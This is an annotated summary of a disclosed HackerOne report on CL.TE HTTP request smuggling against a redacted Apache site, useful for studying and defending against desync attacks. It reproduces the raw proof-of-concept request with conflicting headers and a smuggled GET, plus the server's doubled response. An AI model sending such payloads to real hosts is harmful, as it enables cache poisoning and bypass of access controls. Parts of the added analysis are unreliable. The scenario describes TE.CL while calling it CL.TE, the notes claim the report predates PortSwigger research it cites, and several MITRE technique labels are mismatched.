# HTTP Request Smuggling via CL.TE Desync Attack

## Metadata
- **Source:** HackerOne
- **Report:** 1120982 | https://hackerone.com/reports/1120982
- **Submitted:** 2021-03-09
- **Reporter:** lu3ky-13
- **Program:** HackerOne (Undisclosed)
- **Bounty:** Unknown
- **Severity:** High
- **Vuln:** HTTP Request Smuggling, CL.TE (Content-Length vs Transfer-Encoding) Desync, HTTP Protocol Confusion, Cache Poisoning
- **CVEs:** None
- **Category:** uncategorised

## Summary
HTTP Request Smuggling vulnerability discovered on target domain due to inconsistent HTTP parsing between front-end and back-end servers. Attacker can leverage CL.TE desync by combining Content-Length and Transfer-Encoding headers to poison the backend socket and inject arbitrary requests. This can lead to cache poisoning, security bypass, and unauthorized access to internal resources.

## Attack scenario
1. Attacker crafts malicious HTTP request with conflicting Content-Length (118) and Transfer-Encoding: chunked headers
2. Front-end server interprets request based on Transfer-Encoding, treating chunked encoding as primary (reads until 0-length chunk)
3. Back-end server interprets request based on Content-Length, reading 118 bytes of body data
4. Discrepancy causes injected GET request (intended for internal/unauthorized endpoint) to be prepended to legitimate user's next request on reused TCP connection
5. Smuggled request reaches backend processing and may bypass security controls or access restricted resources
6. Subsequent legitimate requests on same connection inherit poisoned state, potentially receiving cached malicious responses

## Root cause
Front-end and back-end servers implement inconsistent HTTP/1.1 parsing logic when both Content-Length and Transfer-Encoding headers are present. HTTP specification states Transfer-Encoding should take precedence, but some servers prioritize Content-Length, creating desynchronization in request boundary interpretation.

## Attacker mindset
Exploit protocol-level ambiguity in HTTP/1.1 specification to achieve request boundary confusion. Attacker discovered that intentionally conflicting headers cause different servers in the chain to parse the request differently, enabling connection state poisoning. This is a sophisticated understanding of HTTP mechanics and server architecture.

## Defensive takeaways
- Implement strict HTTP request validation: reject requests containing both Content-Length and Transfer-Encoding headers
- Enforce consistent HTTP parsing across all infrastructure tiers (load balancers, reverse proxies, application servers)
- Use HTTP/2 or HTTP/3 which have stronger protocol definitions and less ambiguity
- Implement request smuggling detection at network edge (WAF rules for conflicting headers)
- Ensure front-end and back-end servers use identical RFC 7230 interpretation rules
- Disable HTTP keep-alive if vulnerability cannot be immediately patched
- Monitor for repeated requests from same source with conflicting headers
- Implement connection-level request validation to detect suspicious patterns

## Variant hunting
Search for similar CL.TE, TE.CL, and TE.TE desync patterns on other infrastructure. Test reverse proxies (Nginx, Apache, HAProxy) paired with different backend servers (Apache, IIS, Node.js). Examine custom header parsing logic. Test with obfuscated Transfer-Encoding values (spaces, case variations, tabs). Probe for TE.CL variants where backend prioritizes Content-Length.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1552 - Unsecured Credentials
- T1566 - Phishing
- T1657 - Isolation Evasion

## Notes
Report quality is moderate - contains proper vulnerability classification and PoC but lacks specifics on impact demonstration and remediation suggestions. The redacted nature of the report prevents full validation of attack success. The presence of two HTTP responses (302 and 200) in the response section suggests request smuggling may have succeeded in injecting a second request. Apache servers configured with certain module combinations are known vulnerable. This vulnerability predates PortSwigger's HTTP Desync research but demonstrates practical exploitability in 2021.

## Full report
<details><summary>Expand</summary>

hello dear support 
I have found HTTP Request Smuggling on www.████████

Issue description
==============

HTTP request smuggling vulnerabilities arise when websites route HTTP requests through webservers with inconsistent HTTP parsing.
By supplying a request that gets interpreted as being different lengths by different servers, an attacker can poison the back-end TCP/TLS socket and prepend arbitrary data to the next request. Depending on the website's functionality, this can be used to bypass front-end security rules, access internal systems, poison web caches, and launch assorted attacks on users who are actively browsing the site.

## Impact

Impact
an attacker can poison the TCP / TLS socket and add arbitrary data to the next request. Depending on the functionality of the website, this can be used to bypass front-end security rules, internal system access, poison the web cache, and launch various attacks on users who actively activate the site.

Reference: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

## System Host(s)
www.█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
http request
============
```
GET /404 HTTP/1.1
Host: www.███████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
███████
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 118
Connection: keep-alive

0

GET https://www.███████/███ HTTP/1.1
Host: www.█████████
foo: x
```

http response 
===============
```
HTTP/1.1 302 Found
Date: Tue, 09 Mar 2021 02:54:22 GMT
Server: Apache
Set-Cookie: ███=expiry=1615259062417257;Max-Age=600;path=/;httponly;secure;
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin
Location: https://www.████/404_not_found.html
Content-Length: 236
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="https://www.████████/404_not_found.html">here</a>.</p>
</body></html>
HTTP/1.1 200 OK
Date: Tue, 09 Mar 2021 02:54:22 GMT
Server: Apache
Set-Cookie: ████████=expiry=1615259062417962;Max-Age=600;path=/;httponly;secure;
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin
Cache-Control: no-cache, private
Last-Modified: Mon, 05 Mar 2012 16:45:37 GMT
ETag: "78d0-4ba81a7e20e40"
Accept-Ranges: bytes
Content-Length: 30928
Content-Type: image/png

PNG


```

██████
██████████

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
